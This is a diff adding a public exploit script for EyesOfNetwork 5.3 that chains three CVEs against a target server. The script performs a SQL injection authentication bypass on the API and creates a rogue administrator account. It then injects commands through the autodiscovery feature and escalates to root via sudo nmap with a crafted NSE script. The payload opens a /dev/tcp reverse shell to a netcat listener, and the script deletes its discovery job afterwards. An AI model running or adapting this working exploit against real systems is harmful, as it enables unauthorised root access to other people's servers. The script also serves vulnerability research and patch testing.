@@ -1,0 +1,171 @@
+# Exploit Title: EyesOfNetwork 5.3 - Remote Code Execution
+# Date: 2020-02-01
+# Exploit Author: Clément Billac
+# Vendor Homepage: https://www.eyesofnetwork.com/
+# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso
+# Version: 5.3
+# CVE : CVE-2020-8654, CVE-2020-8655, CVE-2020-8656
+
+#!/bin/env python3
+# coding: utf8
+#
+#
+# CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands
+#                 We were able to run the 'id' command with the following payload in the target field : ';id #'.
+#
+# CVE-2020-8655 - LPE via nmap NSE script
+#                 As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.
+#                 nmap version 6.40 is used and doesn't have the -c and -e options.
+#
+# CVE-2020-8656 - SQLi in API in getApiKey function on 'username' field
+#                 PoC: /eonapi/getApiKey?username=' union select sleep(3),0,0,0,0,0,0,0 or '
+#                 Auth bypass: /eonapi/getApiKey?&username=' union select 1,'admin','1c85d47ff80b5ff2a4dd577e8e5f8e9d',0,0,1,1,8 or '&password=h4knet
+
+# Python imports
+import sys, requests, json, os, argparse, socket
+from bs4 import BeautifulSoup
+
+# Text colors
+txt_yellow = "\033[01;33m"
+txt_blue = "\033[01;34m"
+txt_red = "\033[01;31m"
+txt_green = "\033[01;32m"
+txt_bold = "\033[01;01m"
+txt_reset = "\033[00m"
+txt_info = txt_blue + "[*] " + txt_reset
+txt_success = txt_green + "[+] " + txt_reset
+txt_warn = txt_yellow + "[!] " + txt_reset
+txt_err = txt_red + "[x] " + txt_reset
+
+# Banner
+banner = (txt_bold + """
++-----------------------------------------------------------------------------+
+| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
+| 02/2020 - Clément Billac \033[01;34mTwitter: @h4knet\033[00m                                   |
+|                                                                             |
+| Examples:                                                                   |
+| eonrce.py -h                                                                |
+| eonrce.py http(s)://EyesOfNetwork-URL                                       |
+| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
+| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
++-----------------------------------------------------------------------------+
+""" + txt_reset)
+
+# Arguments Parser
+parser = argparse.ArgumentParser("eonrce", formatter_class=argparse.RawDescriptionHelpFormatter, usage=banner)
+parser.add_argument("URL", metavar="URL", help="URL of the EyesOfNetwork server")
+parser.add_argument("-ip", metavar="IP", help="Local IP to receive reverse shell", default=socket.gethostbyname(socket.gethostname()))
+parser.add_argument("-port", metavar="Port", type=int, help="Local port to listen", default=443)
+parser.add_argument("-user", metavar="Username", type=str, help="Name of the new user to create", default='h4ker')
+parser.add_argument("-password", metavar="Password", type=str, help="Password of the new user", default='net_was_here')
+args = parser.parse_args()
+
+# HTTP Requests config
+requests.packages.urllib3.disable_warnings()
+baseurl = sys.argv[1].strip('/')
+url = baseurl
+useragent = 'Mozilla/5.0 (Windows NT 1.0; WOW64; rv:13.37) Gecko/20200104 Firefox/13.37'
+
+# Admin user creation variables
+new_user = args.user
+new_pass = args.password
+
+# Executed command
+# The following payload performs both the LPE and the reverse shell in a single command.
+# It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.
+# Readable PoC: ;echo "local os = require \"os\" hostrule=function(host) os.execute(\"/bin/sh -i >& /dev/tcp/192.168.30.112/8081 0>&1\") end action=function() end" > /tmp/h4k;sudo /usr/bin/nmap localhost -p 1337 -script /tmp/h4k #
+ip = args.ip
+port = str(args.port)
+cmd = '%3Becho+%22local+os+%3D+require+%5C%22os%5C%22+hostrule%3Dfunction%28host%29+os.execute%28%5C%22%2Fbin%2Fsh+-i+%3E%26+%2Fdev%2Ftcp%2F' + ip + '%2F' + port + '+0%3E%261%5C%22%29+end+action%3Dfunction%28%29+end%22+%3E+%2Ftmp%2Fh4k%3Bsudo+%2Fusr%2Fbin%2Fnmap+localhost+-p+1337+-script+%2Ftmp%2Fh4k+%23'
+
+# Exploit banner
+print (txt_bold,"""+-----------------------------------------------------------------------------+
+| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
+| 02/2020 - Clément Billac \033[01;34mTwitter: @h4knet\033[00m                                  |
++-----------------------------------------------------------------------------+
+""", txt_reset, sep = '')
+
+# Check if it's a EyesOfNetwork login page.
+r = requests.get(baseurl, verify=False, headers={'user-agent':useragent})
+if r.status_code == 200 and r.text.find('<title>EyesOfNetwork</title>') != -1 and r.text.find('form action="login.php" method="POST">') != -1:
+	print(txt_info, "EyesOfNetwork login page found", sep = '')
+else:
+	print(txt_err, 'EyesOfNetwork login page not found', sep = '')
+	quit()
+
+# Check for accessible EON API
+url = baseurl + '/eonapi/getApiKey'
+r = requests.get(url, verify=False, headers={'user-agent':useragent})
+if r.status_code == 401 and 'api_version' in r.json().keys() and 'http_code' in r.json().keys():
+	print(txt_info, 'EyesOfNetwork API page found. API version: ',txt_bold , r.json()['api_version'], txt_reset, sep = '')
+else:
+	print(txt_warn, 'EyesOfNetwork API page not found', sep = '')
+	quit()
+
+# SQL injection with authentication bypass
+url = baseurl + '/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet'
+r = requests.get(url, verify=False, headers={'user-agent':useragent})
+if r.status_code == 200 and 'EONAPI_KEY' in r.json().keys():
+	print(txt_success, 'Admin user key obtained: ', txt_bold, r.json()['EONAPI_KEY'], txt_reset, sep = '')
+else:
+	print(txt_err, 'The host seems patched or unexploitable', sep = '')
+	print(txt_warn, 'Did you specified http instead of https in the URL ?', sep = '')
+	print(txt_warn, 'You can check manually the SQLi with the following payload: ', txt_bold, "/eonapi/getApiKey?username=' union select sleep(3),0,0,0,0,0,0,0 or '", txt_reset, sep = '')
+	quit()
+
+# Adding new administrator
+url = sys.argv[1].strip('/') + '/eonapi/createEonUser?username=admin&apiKey=' + r.json()['EONAPI_KEY']
+r = requests.post(url, verify=False, headers={'user-agent':useragent}, json={"user_name":new_user,"user_group":"admins","user_password":new_pass})
+if r.status_code == 200 and 'result' in r.json().keys():
+	if r.json()['result']['code'] == 0 and 'SUCCESS' in  r.json()['result']['description']:
+		id = r.json()['result']['description'].split('ID = ', 1)[1].split(']')[0]
+		print(txt_success, 'New user ', txt_bold, new_user, txt_reset, ' successfully created. ID:', txt_bold,  id, txt_reset, sep = '')
+
+	elif r.json()['result']['code'] == 1:
+		if ' already exist.' in  r.json()['result']['description']:
+			print(txt_warn, 'The user ', txt_bold, new_user, txt_reset, ' already exists', sep = '')
+		else:
+			print(txt_err, 'An error occured while querying the API. Unexpected description message: ', txt_bold, r.json()['result']['description'], txt_reset, sep = '')
+			quit()
+	else:
+		print(txt_err, 'An error occured while querying the API. Unepected result code. Description: ', txt_bold, r.json()['result']['description'], txt_reset, sep = '')
+		quit()
+else:
+	print(txt_err, 'An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response', sep = '')
+	quit()
+
+# Authentication with our new user
+url = baseurl + '/login.php'
+auth_data = 'login=' + new_user + '&mdp=' +new_pass
+auth_req = requests.post(url, verify=False, headers={'user-agent':useragent,'Content-Type':'application/x-www-form-urlencoded'}, data=auth_data)
+if auth_req.status_code == 200 and 'Set-Cookie' in auth_req.headers:
+	print(txt_success, 'Successfully authenticated', sep = '')
+else:
+	print(txt_err, 'Error while authenticating. We expect to receive Set-Cookie headers uppon successful authentication', sep = '')
+	quit()
+
+# Creating Discovery job
+url = baseurl + '/lilac/autodiscovery.php'
+job_command = 'request=autodiscover&job_name=Internal+discovery&job_description=Internal+EON+discovery+procedure.&nmap_binary=%2Fusr%2Fbin%2Fnmap&default_template=&target%5B2%5D=' + cmd
+r = requests.post(url, verify=False, headers={'user-agent':useragent,'Content-Type':'application/x-www-form-urlencoded'}, cookies=auth_req.cookies, data=job_command)
+if r.status_code == 200 and r.text.find('Starting...') != -1:
+	job_id = str(BeautifulSoup(r.content, "html.parser").find(id="completemsg")).split('?id=', 1)[1].split('&rev')[0]
+	print(txt_success, 'Discovery job successfully created with ID: ', txt_bold, job_id, txt_reset, sep = '')
+else:
+	print(txt_err, 'Error while creating the discovery job', sep = '')
+	quit()
+
+# Launching listener
+print(txt_info, 'Spawning netcat listener:', txt_bold)
+nc_command = '/usr/bin/nc -lnvp' + port + ' -s ' + ip
+os.system(nc_command)
+print(txt_reset)
+
+# Removing job
+url = baseurl + '/lilac/autodiscovery.php?id=' + job_id + '&delete=1'
+r = requests.get(url, verify=False, headers={'user-agent':useragent}, cookies=auth_req.cookies)
+if r.status_code == 200 and r.text.find('Removed Job') != -1:
+	print(txt_info, 'Job ', job_id, ' removed', sep = '')
+else:
+	print(txt_err, 'Error while removing the job', sep = '')
+	quit()
